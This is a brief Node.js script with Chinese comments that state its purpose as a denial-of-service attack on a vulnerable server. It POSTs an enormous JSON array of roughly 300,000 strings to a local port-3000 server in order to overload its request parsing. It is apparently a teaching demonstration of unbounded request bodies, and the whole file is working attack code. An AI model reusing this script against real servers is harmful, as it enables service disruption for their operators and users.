//对脆弱的服务器展开服务攻击

var http=require('http');

var req=http.request({
    method:'POST',
    port:3000,
    headers:{
        'Content-Type':'application/json'//告诉服务器你要发送json数据
    }
});

req.write('[');//开始发送一个超大的数组对象
var n=300000;
while(n--){
    req.write('"foo",');
}
req.write('"bar"]');

req.end();